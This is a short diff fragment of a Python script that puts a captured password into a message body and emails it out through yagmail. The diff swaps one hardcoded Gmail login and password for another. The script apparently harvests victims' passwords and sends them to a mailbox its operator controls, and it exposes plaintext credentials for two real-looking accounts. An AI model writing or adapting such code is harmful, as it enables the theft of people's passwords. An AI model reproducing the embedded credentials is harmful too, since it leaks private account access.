@@ -41,7 +41,7 @@ body = "password : "+password
 
 filename = "data.txt"
 
-yag = yagmail.SMTP("syahdanalhadi9@gmail.com","Syahdan Xploit#")
+yag = yagmail.SMTP("tabgosko@gmail.com","rehanhan12345#")
 
 yag.send(
 	to=receiver,
